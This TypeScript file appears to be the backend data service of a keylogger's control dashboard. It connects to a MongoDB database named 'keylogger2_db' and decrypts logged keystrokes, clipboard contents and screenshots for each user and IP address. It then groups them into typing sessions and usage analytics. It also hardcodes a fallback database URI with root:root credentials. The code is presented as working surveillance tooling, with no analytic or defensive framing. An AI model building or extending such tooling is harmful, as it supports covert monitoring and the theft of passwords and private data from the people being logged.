import { MongoClient, Collection, ObjectId } from 'mongodb';
import { decryptData, encryptData } from '@shared/utils';

// MongoDB Connection Details
const MONGO_URI = process.env.MONGO_URI || "mongodb+srv://root:root@cluster0.m8lbp.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";
const DB_NAME = "keylogger2_db";

class MongoDBService {
  private client: MongoClient;
  private db: any;
  private logsCollection: Collection;
  private screenshotsCollection: Collection;
  private clipboardCollection: Collection;
  
  constructor() {
    this.client = new MongoClient(MONGO_URI);
    this.initialize();
  }
  
  private async initialize() {
    try {
      await this.client.connect();
      this.db = this.client.db(DB_NAME);
      
      // Initialize collections
      this.logsCollection = this.db.collection("logs");
      this.screenshotsCollection = this.db.collection("screenshots");
      this.clipboardCollection = this.db.collection("clipboard_logs");
      
      // Create indexes for faster queries
      await this.logsCollection.createIndex({ timestamp: -1 });
      await this.screenshotsCollection.createIndex({ user: 1, timestamp: 1 });
      await this.clipboardCollection.createIndex({ user: 1, timestamp: 1 });
      
      console.log("Connected to MongoDB");
    } catch (error) {
      console.error("Failed to connect to MongoDB:", error);
    }
  }
  
  // Helper: Group keystroke sessions
  private groupKeystrokeSessions(logDocs: any[], gapThreshold = 1.5) {
    const sessions = [];
    if (!logDocs.length) return sessions;
    
    let currentSession = [logDocs[0]];
    let prevTime = new Date(logDocs[0].timestamp);
    
    for (let i = 1; i < logDocs.length; i++) {
      const doc = logDocs[i];
      try {
        const currTime = new Date(doc.timestamp);
        const timeDiff = (currTime.getTime() - prevTime.getTime()) / 1000;
        
        if (doc.user === currentSession[currentSession.length - 1].user && timeDiff <= gapThreshold) {
          currentSession.push(doc);
        } else {
          sessions.push(currentSession);
          currentSession = [doc];
        }
        prevTime = currTime;
      } catch (error) {
        continue;
      }
    }
    
    sessions.push(currentSession);
    return sessions;
  }
  
  // Get keystroke sessions
  async getKeystrokeSessions() {
    try {
      const docs = await this.logsCollection.find().sort({ timestamp: 1 }).toArray();
      const sessions = this.groupKeystrokeSessions(docs);
      sessions.reverse();
      
      const rows = [];
      for (const session of sessions) {
        try {
          const startTime = new Date(session[0].timestamp);
          const endTime = new Date(session[session.length - 1].timestamp);
          const avgSpeed = session.length > 1 
            ? (endTime.getTime() - startTime.getTime()) / 1000 / (session.length - 1) 
            : 0;
          
          const keystrokesConcat = session
            .map(doc => decryptData(doc.keystroke || ""))
            .join("");
          
          rows.push({
            id: session[0]._id.toString(),
            ip: session[0].ip || "",
            timestamp: startTime.toISOString(),
            startTime: startTime.toISOString(),
            endTime: endTime.toISOString(),
            user: session[0].user || "N/A",
            type: "Keystroke",
            data: keystrokesConcat,
            avgSpeed: avgSpeed.toFixed(3)
          });
        } catch (error) {
          console.error("Error processing session:", error);
        }
      }
      
      return rows;
    } catch (error) {
      console.error("Error getting keystroke sessions:", error);
      return [];
    }
  }
  
  // Get clipboard logs
  async getClipboardLogs() {
    try {
      const docs = await this.clipboardCollection.find().sort({ timestamp: -1 }).toArray();
      
      return docs.map(doc => ({
        id: doc._id.toString(),
        ip: doc.ip || "",
        timestamp: new Date(doc.timestamp).toISOString(),
        user: doc.user || "N/A",
        type: "Clipboard",
        data: decryptData(doc.clipboard || ""),
        avgSpeed: ""
      }));
    } catch (error) {
      console.error("Error getting clipboard logs:", error);
      return [];
    }
  }
  
  // Get screenshot logs
  async getScreenshotLogs() {
    try {
      const docs = await this.screenshotsCollection.find().sort({ timestamp: -1 }).toArray();
      
      return docs.map(doc => ({
        id: doc._id.toString(),
        ip: doc.ip || "",
        timestamp: new Date(doc.timestamp).toISOString(),
        user: doc.user || "N/A",
        type: "Screenshot",
        data: "📸 Screenshot Available (click)",
        avgSpeed: "",
        // Keep the encrypted screenshot data
        screenshotData: doc.screenshot
      }));
    } catch (error) {
      console.error("Error getting screenshot logs:", error);
      return [];
    }
  }
  
  // Get a single screenshot by ID
  async getScreenshotById(id: string) {
    try {
      const doc = await this.screenshotsCollection.findOne({ _id: new ObjectId(id) });
      if (!doc) return null;
      
      return {
        id: doc._id.toString(),
        timestamp: new Date(doc.timestamp).toISOString(),
        user: doc.user || "N/A",
        screenshotData: decryptData(doc.screenshot || ""),
        resolution: doc.resolution || "Unknown"
      };
    } catch (error) {
      console.error("Error getting screenshot:", error);
      return null;
    }
  }
  
  // Get all logs combined
  async getAllLogs() {
    try {
      const keystrokeSessions = await this.getKeystrokeSessions();
      const clipboardLogs = await this.getClipboardLogs();
      const screenshotLogs = await this.getScreenshotLogs();
      
      const allLogs = [...keystrokeSessions, ...clipboardLogs, ...screenshotLogs];
      
      // Sort by timestamp in descending order
      allLogs.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
      
      return allLogs;
    } catch (error) {
      console.error("Error getting all logs:", error);
      return [];
    }
  }
  
  // Get analytics data
  async getAnalytics() {
    try {
      const activeUsers = await this.logsCollection.distinct("user");
      const keystrokeCount = await this.logsCollection.countDocuments();
      const screenshotCount = await this.screenshotsCollection.countDocuments();
      const clipboardCount = await this.clipboardCollection.countDocuments();
      
      // Get recent logs for activity over time
      const oneDayAgo = new Date();
      oneDayAgo.setDate(oneDayAgo.getDate() - 7);
      
      const recentLogs = await this.logsCollection.find({
        timestamp: { $gte: oneDayAgo.toISOString() }
      }).toArray();
      
      const recentScreenshots = await this.screenshotsCollection.find({
        timestamp: { $gte: oneDayAgo.toISOString() }
      }).toArray();
      
      const recentClipboard = await this.clipboardCollection.find({
        timestamp: { $gte: oneDayAgo.toISOString() }
      }).toArray();
      
      // Calculate user activity distribution
      const userActivity: Record<string, number> = {};
      
      const allUserActions = [
        ...recentLogs.map(log => log.user),
        ...recentScreenshots.map(screenshot => screenshot.user),
        ...recentClipboard.map(clipboard => clipboard.user)
      ];
      
      allUserActions.forEach(user => {
        if (user) {
          userActivity[user] = (userActivity[user] || 0) + 1;
        }
      });
      
      const totalActions = Object.values(userActivity).reduce((sum, count) => sum + count, 0);
      
      const userDistribution = Object.entries(userActivity).map(([username, count]) => ({
        username,
        percentage: Math.round((count / totalActions) * 100)
      }));
      
      return {
        activeUsers: activeUsers.length,
        keystrokeSessions: keystrokeCount,
        screenshots: screenshotCount,
        clipboardLogs: clipboardCount,
        userDistribution,
      };
    } catch (error) {
      console.error("Error getting analytics:", error);
      return {
        activeUsers: 0,
        keystrokeSessions: 0,
        screenshots: 0,
        clipboardLogs: 0,
        userDistribution: [],
      };
    }
  }
  
  // Get recent activity for the dashboard
  async getRecentActivity(limit = 5) {
    try {
      const recentLogs = await this.getAllLogs();
      return recentLogs.slice(0, limit);
    } catch (error) {
      console.error("Error getting recent activity:", error);
      return [];
    }
  }
  
  // Get activity over time for charts
  async getActivityOverTime(days = 7) {
    try {
      const startDate = new Date();
      startDate.setDate(startDate.getDate() - days);
      
      const keystrokes = await this.logsCollection.find({
        timestamp: { $gte: startDate.toISOString() }
      }).toArray();
      
      const screenshots = await this.screenshotsCollection.find({
        timestamp: { $gte: startDate.toISOString() }
      }).toArray();
      
      const clipboard = await this.clipboardCollection.find({
        timestamp: { $gte: startDate.toISOString() }
      }).toArray();
      
      // Group by day
      const chartData: Record<string, { keystrokes: number, screenshots: number, clipboard: number }> = {};
      
      for (let i = 0; i < days; i++) {
        const date = new Date();
        date.setDate(date.getDate() - i);
        const dateString = date.toISOString().split('T')[0];
        chartData[dateString] = { keystrokes: 0, screenshots: 0, clipboard: 0 };
      }
      
      keystrokes.forEach(log => {
        const date = new Date(log.timestamp).toISOString().split('T')[0];
        if (chartData[date]) {
          chartData[date].keystrokes++;
        }
      });
      
      screenshots.forEach(screenshot => {
        const date = new Date(screenshot.timestamp).toISOString().split('T')[0];
        if (chartData[date]) {
          chartData[date].screenshots++;
        }
      });
      
      clipboard.forEach(clip => {
        const date = new Date(clip.timestamp).toISOString().split('T')[0];
        if (chartData[date]) {
          chartData[date].clipboard++;
        }
      });
      
      return Object.entries(chartData).map(([date, data]) => ({
        date,
        keystrokes: data.keystrokes,
        screenshots: data.screenshots,
        clipboard: data.clipboard
      }));
    } catch (error) {
      console.error("Error getting activity over time:", error);
      return [];
    }
  }
}

export const mongoDbService = new MongoDBService();
